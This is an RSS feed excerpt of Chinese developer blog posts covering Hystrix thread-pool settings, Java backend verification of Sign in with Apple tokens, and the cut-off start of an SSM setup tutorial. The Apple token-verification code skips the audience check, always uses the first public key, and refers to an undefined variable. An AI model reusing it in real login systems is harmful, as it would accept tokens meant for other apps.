&lt;ul&gt;&lt;li&gt;&lt;strong&gt;keepAliveTimeMinutes&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;当&lt;code&gt;allowMaximumSizeToDivergeFromCoreSize&lt;/code&gt;为&lt;code&gt;true&lt;/code&gt;并且&lt;code&gt;maximumSize&lt;/code&gt;大于&lt;code&gt;coreSize&lt;/code&gt;时此配置才生效。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;大于0的整数&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.default.keepAliveTimeMinutes&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.[HystrixThreadPoolKey].keepAliveTimeMinutes&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;根据真实情况自行配置和调整&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andThreadPoolPropertiesDefaults(HystrixThreadPoolProperties.Setter()
                        .withKeepAliveTimeMinutes(1)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.threadpool.default.keepAliveTimeMinutes=1

# 实例配置
hystrix.threadpool.CustomCommand.keepAliveTimeMinutes=1&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;是否允许最大线程数生效&quot;&gt;是否允许最大线程数生效&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;allowMaximumSizeToDivergeFromCoreSize&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;、&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.default.allowMaximumSizeToDivergeFromCoreSize&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.[HystrixThreadPoolKey].allowMaximumSizeToDivergeFromCoreSize&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;根据真实情况自行配置和调整&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andThreadPoolPropertiesDefaults(HystrixThreadPoolProperties.Setter()
                        .withAllowMaximumSizeToDivergeFromCoreSize(true)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.threadpool.default.allowMaximumSizeToDivergeFromCoreSize=true

# 实例配置
hystrix.threadpool.CustomCommand.allowMaximumSizeToDivergeFromCoreSize=true&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;线程池滑动窗口持续时间&quot;&gt;线程池滑动窗口持续时间&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;metrics.rollingStats.timeInMilliseconds&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;10000&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.default.metrics.rollingStats.timeInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.[HystrixThreadPoolKey].metrics.rollingStats.timeInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议使用默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andThreadPoolPropertiesDefaults(HystrixThreadPoolProperties.Setter()
                        .withMetricsRollingStatisticalWindowInMilliseconds(10000)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.threadpool.default.metrics.rollingStats.timeInMilliseconds=10000

# 实例配置
hystrix.threadpool.CustomCommand.metrics.rollingStats.timeInMilliseconds=10000&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;线程池滑动窗口bucket总数&quot;&gt;线程池滑动窗口Bucket总数&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;metrics.rollingStats.numBuckets&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3.5&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;3&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;满足&lt;code&gt;metrics.rollingStats.timeInMilliseconds % metrics.rollingStats.numBuckets == 0&lt;/code&gt;，值要尽量少，否则会影响性能&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.default.metrics.rollingStats.numBuckets&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.threadpool.[HystrixThreadPoolKey].metrics.rollingStats.numBuckets&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;建议使用默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andThreadPoolPropertiesDefaults(HystrixThreadPoolProperties.Setter()
                        .withMetricsRollingStatisticalWindowBuckets(10)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.threadpool.default.metrics.rollingStats.numBuckets=10

# 实例配置
hystrix.threadpool.CustomCommand.metrics.rollingStats.numBuckets=10&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;原文链接&quot;&gt;原文链接&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;Github Page：http://throwable.club/2019/05/29/framework-hystrix-full-configuration&lt;/li&gt;
&lt;li&gt;Coding Page：http://throwable.coding.me/2019/05/29/framework-hystrix-full-configuration&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;(本文完 e-a-201890602 1:00 AM c-3-d)&lt;/p&gt;
</description>
<pubDate>Fri, 29 Nov 2019 15:59:00 +0000</pubDate>
<dc:creator>throwable</dc:creator>
<og:description>前提 在2018年11月20日之后已经停止维护，最后一个提交记录是： ，最后一个正式版本为 。鉴于目前所在公司的技术栈是 ，熔断和降级组件主要用的还是 ，这里就 的完整列表做一个分析记录，方便以后可以</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/throwable/p/11961016.html</dc:identifier>
</item>
<item>
<title>sign in with apple后端校验（java） - ismallboy</title>
<link>http://www.cnblogs.com/ismallboy/p/11960958.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ismallboy/p/11960958.html</guid>
<description>&lt;p&gt;　　最近新开发的ios平台的app在提审的时候，被拒了，原因是app上如果有接第三方登陆（比如，微信，微博，facebook等），那就必须要接apple id登陆，坑爹~苹果霸权啊！然而没办法，靠他吃饭，他是爸爸，唯有顺从。下面我来说一下对接苹果登陆的后端验证模块，目前这一块网上资料比较少，而且说得不够完整。至于app端的对接，网上一搜，一大堆，很完善。&lt;/p&gt;
&lt;p&gt;　　这里先说一下apple id登陆的主要流程和涉及到的一些知识点。首先apple登陆的时序图如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/416792/201911/416792-20191129232359624-491421003.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;               （来自苹果官网：&lt;a href=&quot;https://developer.apple.com/documentation/signinwithapplerestapi/verifying_a_user&quot;&gt;https://developer.apple.com/documentation/signinwithapplerestapi/verifying_a_user&lt;/a&gt;）&lt;/p&gt;
&lt;p&gt;　　先是app和苹果服务器通信获得identitytoken，然后把identitytoken交给业务后台验证，验证通过就可以了。其中appServer涉及到的验证，就是identitytoken，其实identitytoken就是一个jws（关于jws的只是可以参考&lt;a href=&quot;https://www.jianshu.com/p/50ade6f2e4fd&quot;&gt;https://www.jianshu.com/p/50ade6f2e4fd&lt;/a&gt;），至于校验jws，其实是有现成的jar包可以实现，验证jws的签名，保证数据没有被篡改之后，还要校验从identitytokendecode出来的nonce,iss,aud,exp，主要是iss和exp这两个。下面我直接上代码：&lt;/p&gt;
&lt;p&gt;1.通过maven引入一下两个包，主要是用于验证jws，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;com.auth0&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;jwks-rsa&amp;lt;/artifactId&amp;gt;
            &amp;lt;version&amp;gt;0.9.0&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.bitbucket.b_c&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;jose4j&amp;lt;/artifactId&amp;gt;
            &amp;lt;version&amp;gt;0.6.4&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;io.jsonwebtoken&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;jjwt&amp;lt;/artifactId&amp;gt;
            &amp;lt;version&amp;gt;0.9.1&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;2.验证是identitytoken是否有效，其中有两个主要的地方，第一个就是把从appleServer获取到的publicKey字符串转换为PublicKey对象；第二个就是使用函数&quot;&lt;span&gt;jsonWebSignature.verifySignature()&lt;/span&gt;&quot;验证jws的signature，代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;50&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
public class AppleIdAccountValidationService {
    private final static Logger logger = LoggerFactory.getLogger(AppleIdAccountValidationService.class);
    private final static int APPLE_ID_PUBLIC_KEY_EXPIRE = 24; //24h

    @Autowired
    private StringRedisUtils stringRedisUtils;

    public boolean isValid(String accessToken) {
        //校验基本信息:nonce,iss,aud,exp
        CusJws cusJws = this.getJws(accessToken);
        if (cusJws == null) {
            return false;
        }
        //iss
        long curTime = System.currentTimeMillis();
        if (cusJws.getJwsPayload().getExp() * 1000 &amp;lt; curTime) {
            return false;
        }
        if (!JwsPayload.ISS.equals(cusJws.getJwsPayload().getIss())) {
            return false;
        }
        //校验签名
        if (!this.verifySignature(accessToken)) {
            return false;
        }
        return true;
    }

    /**
     * verify signature
     * @param accessToken
     * @return
     */
    private boolean verifySignature(String accessToken) {
        PublicKey publicKey = this.getAppleIdPublicKey();
        JsonWebSignature jsonWebSignature = new JsonWebSignature();
        jsonWebSignature.setKey(publicKey);
        try {
            jsonWebSignature.setCompactSerialization(accessToken);
            return jsonWebSignature.verifySignature();
        } catch (JoseException e) {
            return false;
        }
    }

    /**
     * publicKey会本地缓存1天
     * @return
     */
    private PublicKey getAppleIdPublicKey() {
        String publicKeyStr = stringRedisUtils.getString(Constants.REDIS_KEY_APPLE_ID_PUBLIC_KEY);
        if (publicKeyStr == null) {
            publicKeyStr = this.getAppleIdPublicKeyFromRemote();
            if (publicKeyStr == null) {
                return null;
            }
            try {
                PublicKey publicKey = this.publicKeyAdapter(publicKeyStr);
                stringRedisUtils.setString(Constants.REDIS_KEY_APPLE_ID_PUBLIC_KEY, publicKeyStr, APPLE_ID_PUBLIC_KEY_EXPIRE, TimeUnit.HOURS);
                return publicKey;
            } catch (Exception ex) {
                ex.printStackTrace();
                return null;
            }
        }
        return this.publicKeyAdapter(publicKeyStr);
    }

    /**
     * 将appleServer返回的publicKey转换成PublicKey对象
     * @param publicKeyStr
     * @return
     */
    private PublicKey publicKeyAdapter(String publicKeyStr) {
        if (!StringUtils.hasText(publicKeyStr)) {
            return null;
        }
        Map maps = (Map)JSON.parse(publicKeyStr);
        List keys = (List&amp;lt;Map&amp;gt;)maps.get(&quot;keys&quot;);
        Map o = (Map) keys.get(0);
        Jwk jwa = Jwk.fromValues(o);
        try {
            PublicKey publicKey = jwa.getPublicKey();
            return publicKey;
        } catch (InvalidPublicKeyException e) {
            e.printStackTrace();
            return null;
        }
    }

    /**
     * 从appleServer获取publicKey
     * @return
     */
    private String getAppleIdPublicKeyFromRemote() {
        ResponseEntity&amp;lt;String&amp;gt; responseEntity = new RestTemplate().getForEntity(&quot;https://appleid.apple.com/auth/keys&quot;, String.class);
        if (responseEntity == null || responseEntity.getStatusCode() != HttpStatus.OK) {
            logger.error(String.format(&quot;getAppleIdPublicKeyFromRemote [%s] exception, detail:&quot;, appleIdPublicKeyUrl));
            return null;
        }
        return responseEntity.getBody();
    }

    private CusJws getJws(String identityToken) {
        String[] arrToken = identityToken.split(&quot;\\.&quot;);
        if (arrToken == null || arrToken.length != 3) {
            return null;
        }
        Base64.Decoder decoder = Base64.getDecoder();
        JwsHeader jwsHeader = JSON.parseObject(new String(decoder.decode(arrToken[0])), JwsHeader.class);
        JwsPayload jwsPayload = JSON.parseObject(new String(decoder.decode(arrToken[1])), JwsPayload.class);
        return new CusJws(jwsHeader, jwsPayload, arrToken[2]);
    }

    class CusJws {
        private JwsHeader jwsHeader;
        private JwsPayload jwsPayload;
        private String signature;

        public CusJws(JwsHeader jwsHeader, JwsPayload jwsPayload, String signature) {
            this.jwsHeader = jwsHeader;
            this.jwsPayload = jwsPayload;
            this.signature = signature;
        }

        public JwsHeader getJwsHeader() {
            return jwsHeader;
        }

        public void setJwsHeader(JwsHeader jwsHeader) {
            this.jwsHeader = jwsHeader;
        }

        public JwsPayload getJwsPayload() {
            return jwsPayload;
        }

        public void setJwsPayload(JwsPayload jwsPayload) {
            this.jwsPayload = jwsPayload;
        }

        public String getSignature() {
            return signature;
        }

        public void setSignature(String signature) {
            this.signature = signature;
        }
    }

    static class JwsHeader {
        private String kid;
        private String alg;

        public String getKid() {
            return kid;
        }

        public void setKid(String kid) {
            this.kid = kid;
        }

        public String getAlg() {
            return alg;
        }

        public void setAlg(String alg) {
            this.alg = alg;
        }
    }

    static class JwsPayload {
        private String iss;
        private String sub;
        private String aud;
        private long exp;
        private long iat;
        private String nonce;
        private String email;
        private boolean email_verified;

        public final static String ISS = &quot;https://appleid.apple.com&quot;;

        public String getIss() {
            return iss;
        }

        public void setIss(String iss) {
            this.iss = iss;
        }

        public String getSub() {
            return sub;
        }

        public void setSub(String sub) {
            this.sub = sub;
        }

        public String getAud() {
            return aud;
        }

        public void setAud(String aud) {
            this.aud = aud;
        }

        public long getExp() {
            return exp;
        }

        public void setExp(long exp) {
            this.exp = exp;
        }

        public long getIat() {
            return iat;
        }

        public void setIat(long iat) {
            this.iat = iat;
        }

        public String getNonce() {
            return nonce;
        }

        public void setNonce(String nonce) {
            this.nonce = nonce;
        }

        public String getEmail() {
            return email;
        }

        public void setEmail(String email) {
            this.email = email;
        }

        public boolean isEmail_verified() {
            return email_verified;
        }

        public void setEmail_verified(boolean email_verified) {
            this.email_verified = email_verified;
        }
    }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;　　结束，有问题欢迎留言讨论~&lt;/p&gt;


&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://developer.apple.com/documentation/signinwithapplerestapi/authenticating_users_with_sign_in_with_apple&quot;&gt;https://developer.apple.com/documentation/signinwithapplerestapi/authenticating_users_with_sign_in_with_apple&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://developer.apple.com/documentation/signinwithapplerestapi/verifying_a_user&quot;&gt;https://developer.apple.com/documentation/signinwithapplerestapi/verifying_a_user&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 29 Nov 2019 15:39:00 +0000</pubDate>
<dc:creator>ismallboy</dc:creator>
<og:description>最近新开发的ios平台的app在提审的时候，被拒了，原因是app上如果有接第三方登陆（比如，微信，微博，facebook等），那就必须要接apple id登陆，坑爹~苹果霸权啊！然而没办法，靠他吃饭，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/ismallboy/p/11960958.html</dc:identifier>
</item>
<item>
<title>SSM框架整合 详细步骤(备注) 附源码 - 陈彦斌</title>
<link>http://www.cnblogs.com/chenyanbin/p/11950761.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chenyanbin/p/11950761.html</guid>
<description>&lt;p&gt;　　将工程的三层结构中的JavaBean分别使用Spring容器(&lt;span&gt;&lt;strong&gt;通过XML方式&lt;/strong&gt;&lt;/span&gt;)进行管理。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;整合持久层mapper，包括数据源、会话工程及mapper代理对象的整合；&lt;/li&gt;
&lt;li&gt;整合业务层Service，包括事务及service的bean的配置；&lt;/li&gt;
&lt;li&gt;整合表现层Controller，直接使用springmvc的配置；&lt;/li&gt;
&lt;li&gt;Web.xml加载spring容器(包含多个XML文件)；&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Spring 核心配置文件：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;applicationContext-dao.xml&lt;/li&gt;
&lt;li&gt;applicationContext-service.xml&lt;/li&gt;
&lt;li&gt;springmvc.xml&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;表现层&lt;/h2&gt;
&lt;p&gt;　　请求URL:/queryItem&lt;/p&gt;
&lt;p&gt;　　请求参数：无&lt;/p&gt;
&lt;p&gt;　　请求返回值：ModelAndView指定Model和View(item-list.jsp)&lt;/p&gt;
&lt;p&gt;　　Request域(Model)：key为itemList&lt;/p&gt;
&lt;h2&gt;业务层&lt;/h2&gt;
&lt;p&gt;　　业务处理逻辑(需求分析)：实现商品列表的查询&lt;/p&gt;
&lt;h2&gt;持久层&lt;/h2&gt;
&lt;p&gt;　　只针对表进行查询&lt;/p&gt;

&lt;h2&gt;&lt;span&gt;依赖包&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;spring(包括springmvc)&lt;/li&gt;
&lt;li&gt;mybatis&lt;/li&gt;
&lt;li&gt;mybatis-spring整合包&lt;/li&gt;
&lt;li&gt;数据库驱动&lt;/li&gt;
&lt;li&gt;第三方连接池&lt;/li&gt;
&lt;li&gt;JSTL&lt;/li&gt;
&lt;li&gt;servlet-api&lt;/li&gt;
&lt;/ol&gt;&lt;h3&gt;pom.xml&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;project &lt;/span&gt;&lt;span&gt;xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://maven.apache.org/POM/4.0.0&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt;
    xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;modelVersion&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;4.0.0&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;modelVersion&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;com.cyb.ssm&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;ssm-project&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;0.0.1-SNAPSHOT&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;packaging&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;war&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;packaging&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependencies&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 持久层依赖开始 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; spring ioc组件需要的依赖包 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-beans&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;5.2.1.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-core&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;5.2.1.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.springframework&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;spring-context&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;5.2.1.RELEASE&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
